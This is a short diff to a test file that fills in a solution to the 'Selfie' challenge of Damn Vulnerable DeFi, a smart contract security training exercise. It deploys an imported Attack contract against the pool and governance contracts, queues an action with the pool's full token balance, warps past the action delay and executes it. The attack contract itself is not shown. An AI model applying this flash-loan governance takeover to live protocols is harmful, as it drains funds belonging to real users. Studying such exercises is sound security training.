@@ -7,6 +7,8 @@ import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
 
+import {Attack} from "./Attack.t.sol";
+
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -62,7 +64,10 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        Attack attack = new Attack(token, governance, pool);
+        attack.attack(TOKENS_IN_POOL, recovery);
+        vm.warp(block.timestamp + governance.getActionDelay());
+        attack.executeCall();
     }
 
     /**
